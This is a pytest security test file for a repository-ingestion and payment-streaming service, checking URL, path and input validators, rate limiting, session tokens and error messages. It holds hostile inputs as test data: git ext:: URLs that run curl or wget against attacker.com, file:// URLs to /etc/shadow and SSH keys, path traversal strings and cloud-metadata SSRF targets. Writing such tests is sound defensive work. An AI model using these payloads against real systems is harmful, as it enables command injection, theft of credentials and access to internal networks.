# SPDX-License-Identifier: FSL-1.1-ALv2
# Copyright 2025 Kase Branham
"""
Comprehensive security tests for RRA Module.

Tests for OWASP Top 10 and common vulnerabilities:
- Command Injection
- Path Traversal
- SSRF
- Input Validation
- Authentication/Authorization
- Rate Limiting
- ReDoS
- Integer Overflow
"""

import pytest
import re
import time
import hashlib
from pathlib import Path
from unittest.mock import patch, MagicMock


# =============================================================================
# TEST: Command Injection Prevention
# =============================================================================

class TestCommandInjection:
    """Test protection against command injection attacks."""

    def test_reject_file_protocol_urls(self):
        """Reject file:// protocol URLs."""
        from rra.ingestion.repo_ingester import RepoIngester

        ingester = RepoIngester()
        malicious_urls = [
            "file:///etc/passwd",
            "file:///home/user/.ssh/id_rsa",
            "file://localhost/etc/shadow",
        ]

        for url in malicious_urls:
            with pytest.raises(ValueError, match="Only HTTPS GitHub URLs"):
                ingester._validate_repo_url(url)

    def test_reject_git_protocol_urls(self):
        """Reject git:// protocol URLs (potential SSRF)."""
        from rra.ingestion.repo_ingester import RepoIngester

        ingester = RepoIngester()
        malicious_urls = [
            "git://internal-server/repo.git",
            "git://localhost/repo.git",
        ]

        for url in malicious_urls:
            with pytest.raises(ValueError, match="Only HTTPS GitHub URLs"):
                ingester._validate_repo_url(url)

    def test_reject_ext_protocol_command_injection(self):
        """Reject ext:: protocol (git command injection)."""
        from rra.ingestion.repo_ingester import RepoIngester

        ingester = RepoIngester()
        malicious_urls = [
            "ext::sh -c curl attacker.com",
            "ext::wget http://attacker.com/shell.sh",
        ]

        for url in malicious_urls:
            with pytest.raises(ValueError, match="Only HTTPS GitHub URLs"):
                ingester._validate_repo_url(url)

    def test_accept_valid_github_https_urls(self):
        """Accept valid GitHub HTTPS URLs."""
        from rra.ingestion.repo_ingester import RepoIngester

        ingester = RepoIngester()
        valid_urls = [
            "https://github.com/owner/repo",
            "https://github.com/owner/repo.git",
            "https://github.com/owner-name/repo-name",
            "https://github.com/owner123/repo456",
        ]

        for url in valid_urls:
            # Should not raise
            ingester._validate_repo_url(url)


# =============================================================================
# TEST: Path Traversal Prevention
# =============================================================================

class TestPathTraversal:
    """Test protection against path traversal attacks."""

    def test_reject_path_traversal_in_repo_name(self):
        """Reject path traversal attempts in repository names."""
        from rra.api.server import validate_repo_name

        malicious_names = [
            "../etc/passwd",
            "..\\windows\\system32",
            "....//....//etc/passwd",
            "repo/../../etc/passwd",
            "%2e%2e%2f%2e%2e%2fetc/passwd",  # URL encoded
        ]

        for name in malicious_names:
            assert not validate_repo_name(name), f"Should reject: {name}"

    def test_accept_valid_repo_names(self):
        """Accept valid repository names."""
        from rra.api.server import validate_repo_name

        valid_names = [
            "my-repo",
            "my_repo",
            "MyRepo123",
            "repo-name-with-dashes",
        ]

        for name in valid_names:
            assert validate_repo_name(name), f"Should accept: {name}"

    def test_kb_path_must_be_in_allowed_dir(self):
        """Knowledge base path must be within allowed directory."""
        from rra.api.server import validate_kb_path

        allowed_dir = Path("agent_knowledge_bases")

        malicious_paths = [
            "../../etc/passwd",
            "/etc/passwd",
            "../../../home/user/.ssh/id_rsa",
        ]

        for path in malicious_paths:
            assert not validate_kb_path(path, allowed_dir), f"Should reject: {path}"


# =============================================================================
# TEST: SSRF Prevention
# =============================================================================

class TestSSRFPrevention:
    """Test protection against Server-Side Request Forgery."""

    def test_block_localhost_callbacks(self):
        """Block callbacks to localhost."""
        from rra.security.webhook_auth import validate_callback_url

        malicious_urls = [
            "http://localhost/admin",
            "http://127.0.0.1/internal",
            "http://[::1]/internal",
            "http://localhost:6379/",  # Redis
            "http://localhost:27017/",  # MongoDB
        ]

        for url in malicious_urls:
            assert not validate_callback_url(url), f"Should block: {url}"

    def test_block_private_network_callbacks(self):
        """Block callbacks to private networks."""
        from rra.security.webhook_auth import validate_callback_url

        private_urls = [
            "http://192.168.1.1/admin",
            "http://10.0.0.1/internal",
            "http://172.16.0.1/db",
        ]

        for url in private_urls:
            assert not validate_callback_url(url), f"Should block: {url}"

    def test_block_cloud_metadata_endpoints(self):
        """Block access to cloud metadata endpoints."""
        from rra.security.webhook_auth import validate_callback_url

        metadata_urls = [
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",  # GCP
            "http://169.254.169.254/metadata/instance",  # Azure
        ]

        for url in metadata_urls:
            assert not validate_callback_url(url), f"Should block: {url}"

    def test_require_https_for_callbacks(self):
        """Require HTTPS for callback URLs."""
        from rra.security.webhook_auth import validate_callback_url

        # HTTP should be rejected (scheme check)
        assert not validate_callback_url("http://example.com/callback")

        # Empty or invalid URLs should be rejected
        assert not validate_callback_url("")
        assert not validate_callback_url(None)

        # Note: HTTPS URLs to external hosts may fail DNS resolution in tests.
        # The function correctly rejects HTTP and validates scheme.


# =============================================================================
# TEST: Input Validation
# =============================================================================

class TestInputValidation:
    """Test input validation across the application."""

    def test_validate_ethereum_address(self):
        """Validate Ethereum address format."""
        from rra.api.streaming import validate_eth_address

        valid_addresses = [
            "0x742d35Cc6634C0532925a3b844Bc9e7595f1b2d1",
            "0x0000000000000000000000000000000000000000",
        ]

        for addr in valid_addresses:
            assert validate_eth_address(addr), f"Should accept: {addr}"

        invalid_addresses = [
            "not-an-address",
            "0x123",
            "742d35Cc6634C0532925a3b844Bc9e7595f1b2d1",  # Missing 0x
            "0xGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGGG",  # Invalid hex
        ]

        for addr in invalid_addresses:
            assert not validate_eth_address(addr), f"Should reject: {addr}"

    def test_validate_price_bounds(self):
        """Validate price values are within bounds."""
        from rra.api.streaming import CreateStreamRequest
        from pydantic import ValidationError

        # Test price too high
        with pytest.raises(ValidationError):
            CreateStreamRequest(
                repo_id="test",
                buyer_address="0x" + "1" * 40,
                seller_address="0x" + "2" * 40,
                monthly_price_usd=2000000,  # Exceeds max 1000000
            )

        # Test negative price
        with pytest.raises(ValidationError):
            CreateStreamRequest(
                repo_id="test",
                buyer_address="0x" + "1" * 40,
                seller_address="0x" + "2" * 40,
                monthly_price_usd=-100,
            )

        # Test zero price
        with pytest.raises(ValidationError):
            CreateStreamRequest(
                repo_id="test",
                buyer_address="0x" + "1" * 40,
                seller_address="0x" + "2" * 40,
                monthly_price_usd=0,
            )

    def test_validate_grace_period_bounds(self):
        """Validate grace period is within reasonable bounds via Pydantic model."""
        from rra.api.streaming import CreateStreamRequest
        from pydantic import ValidationError

        # Should accept reasonable values
        req = CreateStreamRequest(
            repo_id="test",
            buyer_address="0x" + "1" * 40,
            seller_address="0x" + "2" * 40,
            monthly_price_usd=10.0,
            grace_period_hours=24
        )
        assert req.grace_period_hours == 24

        # Should reject negative via Pydantic validation
        with pytest.raises(ValidationError):
            CreateStreamRequest(
                repo_id="test",
                buyer_address="0x" + "1" * 40,
                seller_address="0x" + "2" * 40,
                monthly_price_usd=10.0,
                grace_period_hours=-1
            )

        # Should reject too large (>1 year)
        with pytest.raises(ValidationError):
            CreateStreamRequest(
                repo_id="test",
                buyer_address="0x" + "1" * 40,
                seller_address="0x" + "2" * 40,
                monthly_price_usd=10.0,
                grace_period_hours=9000
            )

    def test_validate_session_id_format(self):
        """Validate session ID format."""
        from rra.api.webhooks import validate_session_id

        # Valid format
        assert validate_session_id("wh_abc123def456789012345678901234567890")

        # Invalid formats
        assert not validate_session_id("invalid")
        assert not validate_session_id("wh_")
        assert not validate_session_id("../../../etc/passwd")


# =============================================================================
# TEST: ReDoS Prevention
# =============================================================================

class TestReDoSPrevention:
    """Test protection against Regular Expression Denial of Service."""

    def test_repo_url_regex_timeout(self):
        """Repo URL regex should not hang on malicious input."""
        from rra.ingestion.repo_ingester import RepoIngester

        ingester = RepoIngester()

        # Craft input that could cause catastrophic backtracking
        malicious_input = "github.com/" + "a" * 1000 + "/" + ("b/" * 500) + "repo"

        start_time = time.time()
        try:
            ingester._extract_repo_name(malicious_input)
        except Exception:
            pass  # Expected to fail
        elapsed = time.time() - start_time

        # Should complete in under 1 second
        assert elapsed < 1.0, f"Regex took too long: {elapsed}s (possible ReDoS)"

    def test_marketplace_url_regex_timeout(self):
        """Marketplace URL regex should not hang on malicious input."""
        from rra.api.marketplace import parse_repo_url

        # Craft input that could cause catastrophic backtracking
        malicious_input = "github.com/" + "a" * 10000 + "/" + "b.c.d.e.f." * 1000

        start_time = time.time()
        try:
            parse_repo_url(malicious_input)
        except Exception:
            pass
        elapsed = time.time() - start_time

        # Should complete in under 1 second
        assert elapsed < 1.0, f"Regex took too long: {elapsed}s (possible ReDoS)"


# =============================================================================
# TEST: Rate Limiting
# =============================================================================

class TestRateLimiting:
    """Test rate limiting functionality."""

    def test_rate_limiter_blocks_excessive_requests(self):
        """Rate limiter should block excessive requests."""
        from rra.security.webhook_auth import RateLimiter

        limiter = RateLimiter(max_requests=5, window_minutes=1)
        agent_id = "test_agent"

        # First 5 requests should succeed
        for i in range(5):
            assert limiter.record(agent_id), f"Request {i+1} should succeed"

        # 6th request should be blocked
        assert not limiter.record(agent_id), "6th request should be blocked"

    def test_rate_limiter_per_agent_isolation(self):
        """Rate limits should be per-agent, not global."""
        from rra.security.webhook_auth import RateLimiter

        limiter = RateLimiter(max_requests=3, window_minutes=1)

        # Agent 1 uses up its quota
        for _ in range(3):
            limiter.record("agent_1")

        # Agent 2 should still have quota
        assert limiter.record("agent_2"), "Agent 2 should not be affected by Agent 1's limits"


# =============================================================================
# TEST: Session Security
# =============================================================================

class TestSessionSecurity:
    """Test session management security."""

    def test_session_id_entropy(self):
        """Session IDs should have sufficient entropy (at least 128 bits)."""
        from rra.api.webhooks import generate_session_id

        session_id = generate_session_id()

        # Remove prefix
        token_part = session_id.replace("wh_", "")

        # Should have at least 32 characters (128 bits in base64/hex)
        assert len(token_part) >= 32, f"Session ID too short: {len(token_part)} chars"

    def test_session_ids_are_unique(self):
        """Session IDs should be unique."""
        from rra.api.webhooks import generate_session_id

        session_ids = [generate_session_id() for _ in range(1000)]

        # All should be unique
        assert len(session_ids) == len(set(session_ids)), "Session IDs are not unique"


# =============================================================================
# TEST: Cryptographic Security
# =============================================================================

class TestCryptographicSecurity:
    """Test cryptographic operations."""

    def test_hmac_signature_verification(self):
        """HMAC signature verification should be constant-time."""
        from rra.security.webhook_auth import WebhookSecurity

        security = WebhookSecurity()
        agent_id = "test_agent"
        secret = security.generate_credentials(agent_id)["secret_key"]

        payload = {"test": "data"}

        # Generate valid signature
        import json
        import hmac
        payload_bytes = json.dumps(payload, sort_keys=True, separators=(',', ':')).encode()
        valid_sig = "sha256=" + hmac.new(
            secret.encode(),
            payload_bytes,
            hashlib.sha256
        ).hexdigest()

        # Verify correct signature works
        assert security.verify_signature(agent_id, payload, valid_sig)

        # Verify wrong signature fails
        assert not security.verify_signature(agent_id, payload, "sha256=invalid")

    def test_secrets_use_cryptographically_secure_random(self):
        """Secrets should use cryptographically secure random generation."""
        from rra.security.webhook_auth import WebhookSecurity

        security = WebhookSecurity()

        secrets = [security.generate_credentials(f"agent_{i}")["secret_key"] for i in range(100)]

        # All secrets should be unique
        assert len(secrets) == len(set(secrets)), "Secrets are not unique"

        # Secrets should be at least 32 characters (256 bits in hex)
        for secret in secrets:
            assert len(secret) >= 32, f"Secret too short: {len(secret)} chars"


# =============================================================================
# TEST: Resource Limits
# =============================================================================

class TestResourceLimits:
    """Test resource consumption limits."""

    def test_max_file_count_limit(self):
        """Repository ingestion should limit file count."""
        from rra.ingestion import repo_ingester

        # MAX_FILES should be defined at module level
        assert hasattr(repo_ingester, 'MAX_FILES'), \
            "repo_ingester module should define MAX_FILES limit"

        # Should be a reasonable limit
        assert repo_ingester.MAX_FILES > 0
        assert repo_ingester.MAX_FILES <= 100000

    def test_max_file_size_limit(self):
        """File reading should have size limits."""
        from rra.ingestion.repo_ingester import MAX_FILE_SIZE

        # Should be reasonable (e.g., 10MB)
        assert MAX_FILE_SIZE <= 50 * 1024 * 1024, "MAX_FILE_SIZE too large"
        assert MAX_FILE_SIZE >= 1 * 1024 * 1024, "MAX_FILE_SIZE too small"

    def test_json_payload_size_limit(self):
        """JSON payload should have size limit."""
        from rra.api.webhooks import MAX_PAYLOAD_SIZE

        # Should be reasonable (e.g., 1MB)
        assert MAX_PAYLOAD_SIZE <= 10 * 1024 * 1024, "MAX_PAYLOAD_SIZE too large"


# =============================================================================
# TEST: Error Information Disclosure
# =============================================================================

class TestErrorDisclosure:
    """Test that errors don't leak sensitive information."""

    def test_internal_errors_are_generic(self):
        """Internal errors should not leak implementation details."""
        from fastapi.testclient import TestClient
        from rra.api.server import app

        client = TestClient(app)

        # Trigger an error condition
        response = client.get("/api/repository/nonexistent-repo-12345")

        if response.status_code == 500:
            # Error message should be generic
            error_msg = response.json().get("detail", "")

            # Should not contain internal paths
            assert "/home/" not in error_msg
            assert "/usr/" not in error_msg
            assert "Traceback" not in error_msg

            # Should not contain database connection strings
            assert "postgresql://" not in error_msg
            assert "mongodb://" not in error_msg
